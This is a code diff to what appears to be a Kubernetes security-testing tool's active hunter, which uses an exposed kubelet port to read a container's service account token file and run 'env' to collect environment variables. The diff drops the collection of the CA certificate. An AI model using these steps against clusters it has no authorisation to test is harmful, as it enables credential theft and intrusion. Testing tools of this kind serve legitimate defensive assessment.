@@ -510,19 +510,12 @@ class FootholdViaSecureKubeletPort(ActiveHunter):
     def process_container(self, run_request_url):
         service_account_token = self.cat_command(run_request_url, "/var/run/secrets/kubernetes.io/serviceaccount/token")
 
-        certificate_authority = self.cat_command(
-            run_request_url, "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
-        )
-
         environment_variables = self.post_request(run_request_url, {"cmd": "env"})
 
-        if self.has_no_error_nor_exception(service_account_token) and self.has_no_error_nor_exception(
-            certificate_authority
-        ):
+        if self.has_no_error_nor_exception(service_account_token):
             return {
                 "result": True,
                 "service_account_token": service_account_token,
-                "certificate_authority": certificate_authority,
                 "environment_variables": environment_variables,
             }
 
@@ -555,7 +548,6 @@ class FootholdViaSecureKubeletPort(ActiveHunter):
 
                     if extracted_data["result"]:
                         service_account_token = extracted_data["service_account_token"]
-                        certificate_authority = extracted_data["certificate_authority"]
                         environment_variables = extracted_data["environment_variables"]
 
                         temp_message += (
@@ -563,7 +555,6 @@ class FootholdViaSecureKubeletPort(ActiveHunter):
                             + "\n\nPod ID: {}".format(pod_id)
                             + "\n\nContainer name: {}".format(container_name)
                             + "\n\nService account token: {}".format(service_account_token)
-                            + "\n\nCertificate authority: {}".format(certificate_authority)
                             + "\nEnvironment variables: {}".format(environment_variables)
                         )
 
@@ -582,7 +573,6 @@ class FootholdViaSecureKubeletPort(ActiveHunter):
                                     "pod_id": pod_id,
                                     "container_name": container_name,
                                     "service_account_token": service_account_token,
-                                    "certificate_authority": certificate_authority,
                                     "environment_variables": environment_variables,
                                 }
                             )
